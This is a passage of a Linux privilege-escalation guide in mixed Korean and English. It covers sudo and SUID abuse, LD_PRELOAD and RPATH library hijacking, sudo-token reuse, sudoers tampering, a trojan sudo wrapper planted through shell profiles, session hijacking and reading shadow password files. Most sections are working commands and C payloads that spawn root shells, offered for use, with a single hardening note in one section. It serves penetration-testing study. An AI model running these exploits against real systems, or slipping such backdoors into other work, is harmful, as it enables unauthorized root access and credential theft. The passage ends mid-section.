Check **more ways to break out from docker or abuse it to escalate privileges** in:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

만약 **`ctr`** 명령을 사용할 수 있다면 다음 페이지를 읽으세요 — **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

만약 **`runc`** 명령을 사용할 수 있다면 다음 페이지를 읽으세요 — **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus는 애플리케이션들이 효율적으로 상호작용하고 데이터를 공유할 수 있게 해주는 정교한 **inter-Process Communication (IPC) system**입니다. 현대 Linux 시스템을 염두에 두고 설계되어 다양한 형태의 애플리케이션 통신을 위한 견고한 프레임워크를 제공합니다.

이 시스템은 프로세스 간 데이터 교환을 향상시키는 기본적인 IPC를 지원하며, **enhanced UNIX domain sockets**를 연상시키는 특성을 지닙니다. 또한 이벤트나 신호를 브로드캐스트하는 기능을 통해 시스템 구성 요소 간의 원활한 통합을 돕습니다. 예를 들어, Bluetooth daemon이 수신 전화에 대한 신호를 보내면 음악 플레이어가 음소거되는 식으로 사용자 경험을 향상시킬 수 있습니다. 추가로, D-Bus는 원격 객체 시스템을 지원하여 애플리케이션 간의 서비스 요청과 메서드 호출을 단순화하고, 전통적으로 복잡했던 과정을 간소화합니다.

D-Bus는 **allow/deny model**로 동작하며, 매칭되는 정책 규칙들의 누적 효과에 따라 메시지 권한(메서드 호출, 신호 전송 등)을 관리합니다. 이러한 정책들은 버스와의 상호작용을 지정하며, 해당 권한을 악용하면 privilege escalation으로 이어질 수 있습니다.

예를 들어 `/etc/dbus-1/system.d/wpa_supplicant.conf`에 있는 이러한 정책은 root 사용자가 `fi.w1.wpa_supplicant1`을 소유하고, 해당 대상에게 메시지를 보내고, 메시지를 받을 수 있는 권한을 상세히 규정하고 있습니다.

사용자나 그룹이 명시되지 않은 정책은 모든 사용자에게 적용되며, "default" 컨텍스트 정책은 다른 특정 정책에 의해 다루어지지 않는 모든 대상에 대해 적용됩니다.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**여기에서 D-Bus communication을 enumerate하고 exploit하는 방법을 배우세요:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **네트워크**

네트워크를 enumerate하여 머신의 위치를 파악하는 것은 항상 흥미롭습니다.

### Generic enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Open ports

항상 접근하기 전에 상호작용할 수 없었던 머신에서 실행 중인 네트워크 서비스를 확인하세요:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

sniff traffic을 할 수 있는지 확인하세요. 할 수 있다면 credentials를 획득할 수 있습니다.
```
timeout 1 tcpdump
```
## 사용자

### 일반적인 열거

자신이 **who** 인지, 어떤 **privileges** 를 가지고 있는지, 시스템에 어떤 **users** 가 있는지, 누가 **login** 할 수 있는지, 누가 **root privileges** 를 가지고 있는지 확인하세요:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

일부 Linux 버전은 **UID > INT_MAX**인 사용자가 권한을 상승시킬 수 있는 버그의 영향을 받았습니다. 자세한 정보: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**악용하려면** 다음을 사용하세요: **`systemd-run -t /bin/bash`**

### Groups

root 권한을 부여할 수 있는 **그룹의 멤버인지 확인하세요:**


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Clipboard

가능하면 클립보드에 흥미로운 내용이 있는지 확인하세요
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### 비밀번호 정책
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### 알려진 비밀번호

환경의 **비밀번호를 알고 있다면**, 그 비밀번호를 사용해 **각 사용자로 로그인해 보세요**.

### Su Brute

많은 소음을 발생시키는 것을 개의치 않고 대상 컴퓨터에 `su`와 `timeout` 바이너리가 존재한다면, [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)의 `-a` 파라미터도 사용자 브루트포스를 시도합니다.

## 쓰기 가능한 PATH 악용

### $PATH

만약 $PATH의 일부 폴더에 **쓰기가 가능하다면**, 다른 사용자(이상적으로는 root)가 실행할 명령어 이름으로 **쓰기 가능한 폴더 안에 backdoor를 생성함으로써** 권한을 상승시킬 수 있습니다. 단, 해당 명령어는 $PATH에서 당신의 쓰기 가능한 폴더보다 **앞에 위치한 폴더에서 로드되지 않아야 합니다**.

### SUDO and SUID

sudo를 사용해 특정 명령을 실행할 수 있거나, 파일에 suid 비트가 설정되어 있을 수 있습니다. 다음을 사용해 확인하세요:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
일부 **예상치 못한 명령어는 파일을 읽고/또는 쓰거나 심지어 명령을 실행할 수 있습니다.** 예를 들어:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo 구성은 사용자가 비밀번호를 알지 못해도 다른 사용자의 권한으로 일부 명령을 실행할 수 있도록 허용할 수 있다.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
이 예에서 사용자 `demo`는 `root` 권한으로 `vim`을 실행할 수 있으므로, 루트 디렉터리에 ssh key를 추가하거나 `sh`를 호출해 쉘을 얻는 것은 이제 간단합니다.
```
sudo vim -c '!sh'
```
### SETENV

이 지시문은 사용자가 어떤 것을 실행하는 동안 **환경 변수를 설정하도록 허용합니다:**
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
이 예제는 **based on HTB machine Admirer**에 기반했고, 스크립트를 root로 실행할 때 임의의 python 라이브러리를 로드하기 위한 **PYTHONPATH hijacking**에 **취약했습니다**:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV preserved via sudo env_keep → root shell

만약 sudoers가 `BASH_ENV`를 보존한다면 (예: `Defaults env_keep+="ENV BASH_ENV"`), Bash의 비대화형 시작 동작을 이용해 허용된 명령을 호출할 때 임의의 코드를 root 권한으로 실행할 수 있습니다.

- Why it works: 비대화형 쉘의 경우 Bash는 `$BASH_ENV`를 평가하고 대상 스크립트를 실행하기 전에 해당 파일을 소스합니다. 많은 sudo 규칙은 스크립트나 쉘 래퍼의 실행을 허용합니다. sudo가 `BASH_ENV`를 보존하면, 해당 파일이 root 권한으로 소스됩니다.

- Requirements:
- 실행할 수 있는 sudo 규칙 (비대화형으로 `/bin/bash`를 호출하는 대상이나, 임의의 bash 스크립트).
- `env_keep`에 `BASH_ENV`가 포함되어 있어야 함 (`sudo -l`로 확인).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- 하드닝:
- `BASH_ENV` (및 `ENV`)를 `env_keep`에서 제거하고 `env_reset`을 권장합니다.
- sudo로 허용된 명령에 대한 shell wrapper를 피하고, 최소한의 바이너리를 사용하세요.
- 보존된 env vars가 사용될 때 sudo I/O 로깅 및 경고를 고려하세요.

### Sudo 실행 우회 경로

**Jump** 다른 파일을 읽거나 **symlinks**를 사용하세요. 예: sudoers 파일에서: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
만약 **wildcard**가 사용된다면 (\*), 훨씬 더 쉽습니다:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**대응책**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo 명령/SUID 바이너리 — 명령 경로 없이

만약 **sudo permission**이 단일 명령어에 대해 **경로를 지정하지 않고** 부여되어 있다면: _hacker10 ALL= (root) less_ PATH 변수를 변경하여 이를 악용할 수 있습니다
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
이 기법은 **suid** 바이너리가 **다른 명령을 실행할 때 경로를 지정하지 않는 경우에도** 사용할 수 있습니다(항상 이상한 SUID 바이너리의 내용을 _**strings**_ 로 확인하세요).

[Payload examples to execute.](payloads-to-execute.md)

### SUID 바이너리 — 명령 경로가 지정된 경우

만약 **suid** 바이너리가 **경로를 지정하여 다른 명령을 실행한다면**, suid 파일이 호출하는 명령 이름으로 된 함수를 만들어 **export** 해보세요.

예를 들어, 만약 suid 바이너리가 _**/usr/sbin/service apache2 start**_ 를 호출한다면 해당 함수를 생성하고 export 해야 합니다:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
그런 다음 suid 바이너리를 호출하면 이 함수가 실행됩니다

### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD** 환경 변수는 표준 C 라이브러리(`libc.so`)를 포함한 다른 모든 라이브러리보다 먼저 로더에 의해 로드되도록 하나 이상의 shared libraries(.so 파일)를 지정하는 데 사용됩니다. 이 과정을 라이브러리 preloading이라고 합니다.

그러나 시스템 보안을 유지하고 특히 **suid/sgid** 실행 파일에서 이 기능이 악용되는 것을 방지하기 위해 시스템은 다음과 같은 조건들을 적용합니다:

- 실제 사용자 ID (_ruid_)가 유효 사용자 ID (_euid_)와 일치하지 않는 실행 파일에 대해 로더는 **LD_PRELOAD**를 무시합니다.
- suid/sgid인 실행 파일의 경우, 사전 로드되는 라이브러리는 표준 경로에 있고 또한 suid/sgid인 라이브러리로만 제한됩니다.

Privilege escalation은 `sudo`로 명령을 실행할 수 있고 `sudo -l`의 출력에 **env_keep+=LD_PRELOAD**가 포함된 경우 발생할 수 있습니다. 이 구성은 `sudo`로 명령을 실행할 때도 **LD_PRELOAD** 환경 변수가 유지되어 인식되도록 허용하며, 잠재적으로 arbitrary code가 elevated privileges로 실행되게 할 수 있습니다.
```
Defaults        env_keep += LD_PRELOAD
```
다음 경로로 저장: **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
그런 다음 **컴파일하세요** 다음을 사용하여:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
마지막으로, **escalate privileges**를 실행합니다.
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> 유사한 privesc는 공격자가 **LD_LIBRARY_PATH** env variable을 제어할 경우 악용될 수 있습니다. 공격자는 라이브러리가 검색될 경로를 제어하게 됩니다.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

이상해 보이는 **SUID** 권한을 가진 binary를 발견하면, **.so** 파일을 제대로 로드하는지 확인하는 것이 좋다. 다음 명령어를 실행하여 확인할 수 있다:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
예를 들어, _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ 같은 오류가 발생하면 잠재적인 악용 가능성이 있음을 시사합니다.

이를 악용하려면 C 파일, 예를 들어 _"/path/to/.config/libcalc.c"_ 를 생성하여 다음 코드를 포함하면 됩니다:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
이 코드는 컴파일되고 실행되면 파일 권한을 조작하고 권한이 상승된 셸을 실행하여 권한을 상승시키는 것을 목표로 합니다.

위 C 파일을 다음 명령으로 공유 객체(.so) 파일로 컴파일하세요:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
마지막으로, 영향을 받은 SUID 바이너리를 실행하면 exploit가 트리거되어 잠재적인 system compromise를 초래할 수 있습니다.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
이제 우리가 쓸 수 있는 folder에서 library를 로드하는 SUID binary를 찾았으니, 해당 folder에 필요한 이름으로 library를 생성합시다:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
다음과 같은 오류가 발생하면
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
that means that the library you have generated need to have a function called `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) 은 로컬 보안 제한을 우회하기 위해 공격자가 악용할 수 있는 Unix binaries의 큐레이션된 목록입니다. [**GTFOArgs**](https://gtfoargs.github.io/) 는 명령에 **only inject arguments** 할 수 있는 경우에 대한 동일한 자료입니다.

이 프로젝트는 제한된 쉘을 탈출하거나, 권한을 상승하거나 유지하고, 파일을 전송하거나, bind 및 reverse shells를 생성하고, 기타 post-exploitation 작업을 용이하게 하는 데 악용될 수 있는 Unix binaries의 정당한 기능들을 수집합니다.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

If you can access `sudo -l` you can use the tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) to check if it finds how to exploit any sudo rule.

### Reusing Sudo Tokens

특정 경우에 **sudo access**는 있지만 비밀번호를 모를 때, **sudo 명령 실행이 발생하기를 기다렸다가 세션 토큰을 탈취함으로써** 권한을 상승시킬 수 있습니다.

권한을 상승시키기 위한 요구사항:

- 이미 사용자 "_sampleuser_" 로 쉘을 가지고 있어야 합니다.
- "_sampleuser_" 은 **사용자 `sudo`** 를 통해 **지난 15mins 내에** 무언가를 실행한 적이 있어야 합니다 (기본적으로 이는 비밀번호 없이 `sudo`를 사용할 수 있게 해주는 sudo 토큰의 지속 시간입니다).
- `cat /proc/sys/kernel/yama/ptrace_scope` 가 0 이어야 합니다.
- `gdb` 에 접근 가능해야 합니다 (업로드할 수 있어야 합니다).

(You can temporarily enable `ptrace_scope` with `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` or permanently modifying `/etc/sysctl.d/10-ptrace.conf` and setting `kernel.yama.ptrace_scope = 0`)

위의 모든 요구사항이 충족되면, **다음을 사용해 권한을 상승시킬 수 있습니다:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- 이 **second exploit** (`exploit_v2.sh`)는 _/tmp_에 sh 셸을 생성하며 **root가 소유하고 setuid를 가진**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- 이 **third exploit** (`exploit_v3.sh`)는 **sudoers file**을 생성하여 **sudo tokens**을 영구화하고 모든 사용자가 **sudo**를 사용할 수 있게 합니다
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

폴더 또는 그 안에 생성된 파일들 중 어느 것에든 **쓰기 권한**이 있다면 바이너리 [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools)를 사용해 **사용자와 PID에 대한 sudo 토큰을 생성할 수 있습니다**.\\

예를 들어, 파일 _/var/run/sudo/ts/sampleuser_를 덮어쓸 수 있고 해당 사용자로 PID 1234인 셸을 가지고 있다면, 비밀번호를 알 필요 없이 **sudo 권한을 획득할 수 있습니다** 다음을 실행하여:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

파일 `/etc/sudoers` 및 `/etc/sudoers.d` 내부의 파일들은 누가 `sudo`를 어떻게 사용할 수 있는지를 구성합니다.\
이 파일들은 **기본적으로 user root와 group root만 읽을 수 있습니다**.\
**If** 이 파일을 **read**할 수 있다면 **흥미로운 정보를 얻을 수 있습니다**, 그리고 어떤 파일을 **write**할 수 있다면 **escalate privileges**할 수 있습니다.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
쓰기 권한이 있으면 이 권한을 악용할 수 있다.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
이러한 권한을 악용하는 또 다른 방법:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

`sudo` 바이너리에는 OpenBSD의 `doas`와 같은 몇 가지 대안이 있으므로 `/etc/doas.conf`에서 설정을 확인하세요.
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

**사용자가 보통 머신에 접속하여 권한 상승을 위해 `sudo`를 사용하는 경우**이고 그 사용자 컨텍스트에서 쉘을 얻었다면, 루트로 당신의 코드를 실행한 다음 사용자의 명령을 실행하는 새로운 sudo 실행파일을 **만들 수 있습니다**. 그런 다음 사용자 컨텍스트의 $PATH(예: 새로운 경로를 .bash_profile에 추가)를 **수정**하여 사용자가 sudo를 실행할 때 당신의 sudo 실행파일이 실행되도록 합니다.

사용자가 다른 쉘(bash가 아닌)을 사용하는 경우 새 경로를 추가하려면 다른 파일들을 수정해야 합니다. 예를 들어[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) 는 `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`을 수정합니다. 또 다른 예시는 [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)에서 찾을 수 있습니다.

또는 다음과 같은 명령을 실행하는 방법도 있습니다:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## 공유 라이브러리

### ld.so

The file `/etc/ld.so.conf` indicates **where the loaded configurations files are from**. Typically, this file contains the following path: `include /etc/ld.so.conf.d/*.conf`

That means that the configuration files from `/etc/ld.so.conf.d/*.conf` will be read. This configuration files **points to other folders** where **libraries** are going to be **searched** for. For example, the content of `/etc/ld.so.conf.d/libc.conf` is `/usr/local/lib`. **This means that the system will search for libraries inside `/usr/local/lib`**.

If for some reason **a user has write permissions** on any of the paths indicated: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, any file inside `/etc/ld.so.conf.d/` or any folder within the config file inside `/etc/ld.so.conf.d/*.conf` he may be able to escalate privileges.\
다음 페이지에서 이 구성 오류를 **어떻게 악용할 수 있는지** 확인하세요:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
`/var/tmp/flag15/`에 lib을 복사하면 `RPATH` 변수에 명시된 대로 프로그램이 이 위치의 lib을 사용합니다.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
그런 다음 `/var/tmp`에 다음 명령으로 악성 라이브러리를 생성하세요: `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities는 프로세스에 제공되는 **root privileges의 하위 집합**을 제공합니다. 이는 root **privileges를 더 작고 구별된 단위들로 분할**하는 효과가 있습니다. 각 단위는 독립적으로 프로세스에 부여될 수 있습니다. 이렇게 전체 privileges 집합이 축소되어 exploitation의 위험이 줄어듭니다.\
다음 페이지를 읽어 **capabilities 및 그것을 악용하는 방법**에 대해 더 알아보세요:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

디렉터리에서, **"execute" 비트**는 해당 사용자가 **"cd"** 해서 폴더에 들어갈 수 있음을 의미합니다.\
**"read"** 비트는 사용자가 **파일 목록을 볼** 수 있음을 의미하고, **"write"** 비트는 사용자가 **파일을 삭제**하고 **새 파일을 생성**할 수 있음을 의미합니다.

## ACLs

Access Control Lists (ACLs)는 재량적 권한의 2차 계층을 나타내며, 전통적인 ugo/rwx 권한을 **overriding** 할 수 있습니다. 이러한 권한은 소유자나 그룹에 속하지 않은 특정 사용자에게 권한을 허용하거나 거부함으로써 파일 또는 디렉터리 접근 제어를 강화합니다. 이 수준의 **granularity는 보다 정밀한 접근 관리를 보장**합니다. 자세한 내용은 [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux)에서 확인하세요.

**사용자** "kali"에게 파일에 대한 read 및 write 권한을 부여:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**가져오기** 시스템에서 특정 ACLs를 가진 파일:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## shell sessions 열기

**이전 버전**에서는 다른 사용자(**root**)의 일부 **shell** session을 **hijack**할 수 있습니다.\
**최신 버전**에서는 **connect**를 통해 **screen sessions**에 오직 **your own user**의 것만 접속할 수 있습니다. 그러나 **세션 내부의 흥미로운 정보**를 찾을 수 있습니다.

### screen sessions hijacking

**List screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**세션에 연결**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

이 문제는 **구버전 tmux**에서 발생했습니다. 권한이 없는 사용자로서 root가 생성한 tmux (v2.1) session을 hijack할 수 없었습니다.

**tmux 세션 나열**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**세션에 연결**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

All SSL and SSH keys generated on Debian based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected by this bug.\
이 버그는 해당 OS에서 새 ssh 키를 생성할 때 발생하며, **가능한 조합이 단지 32,768개 뿐이었습니다**. 이는 모든 가능성을 계산할 수 있다는 의미이며 **ssh public key를 알고 있다면 해당하는 private key를 검색할 수 있습니다**. 계산된 가능성은 여기에서 찾을 수 있습니다: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Specifies whether password authentication is allowed. The default is `no`.
- **PubkeyAuthentication:** Specifies whether public key authentication is allowed. The default is `yes`.
- **PermitEmptyPasswords**: When password authentication is allowed, it specifies whether the server allows login to accounts with empty password strings. The default is `no`.

### PermitRootLogin

Specifies whether root can log in using ssh, default is `no`. Possible values:

- `yes`: root can login using password and private key
- `without-password` or `prohibit-password`: root can only login with a private key
- `forced-commands-only`: Root can login only using private key and if the commands options are specified
- `no` : no

### AuthorizedKeysFile

Specifies files that contain the public keys that can be used for user authentication. It can contain tokens like `%h`, which will be replaced by the home directory. **You can indicate absolute paths** (starting in `/`) or **relative paths from the user's home**. For example:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
해당 설정은 사용자 "**testusername**"의 **private** 키로 로그인하려 할 경우, ssh가 당신의 public key를 `/home/testusername/.ssh/authorized_keys` 및 `/home/testusername/access`에 있는 키들과 비교하도록 지정합니다.

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding은 서버에 키를 남겨두지 않고도 **use your local SSH keys instead of leaving keys** (without passphrases!) 할 수 있게 해줍니다. 따라서 ssh로 **jump** **to a host** 한 다음, 그곳에서 **jump to another** host를 **using** the **key** located in your **initial host** 할 수 있습니다.

You need to set this option in `$HOME/.ssh.config` like this:
```
Host example.com
ForwardAgent yes
```
주의: `Host`가 `*`이면 사용자가 다른 머신으로 이동할 때마다 해당 호스트가 키에 접근할 수 있으므로 이는 보안 문제입니다.

파일 `/etc/ssh_config`는 이 **옵션들**을 **재정의**할 수 있으며 이 구성을 허용하거나 거부할 수 있습니다.\
파일 `/etc/sshd_config`는 키워드 `AllowAgentForwarding`로 ssh-agent forwarding을 **허용**하거나 **거부**할 수 있습니다(기본값은 허용).

If you find that Forward Agent is configured in an environment read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## 흥미로운 파일

### Profile 파일들

파일 `/etc/profile`와 `/etc/profile.d/` 아래의 파일들은 사용자가 새 쉘을 실행할 때 **실행되는 스크립트들**입니다. 따라서, 이들 중 어느 하나를 **작성하거나 수정할 수 있다면 you can escalate privileges**.
```bash
ls -l /etc/profile /etc/profile.d/
```
If any weird profile script is found you should check it for **sensitive details**.

### Passwd/Shadow 파일

OS에 따라 `/etc/passwd`와 `/etc/shadow` 파일은 다른 이름을 사용하거나 백업이 존재할 수 있습니다. 따라서 **모두 찾아서** 파일을 **읽을 수 있는지 확인**하고 내부에 **해시가 있는지** 확인하는 것이 좋습니다:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
경우에 따라 `/etc/passwd` (또는 이에 상응하는) 파일 내부에서 **password hashes**를 찾을 수 있습니다
```bash
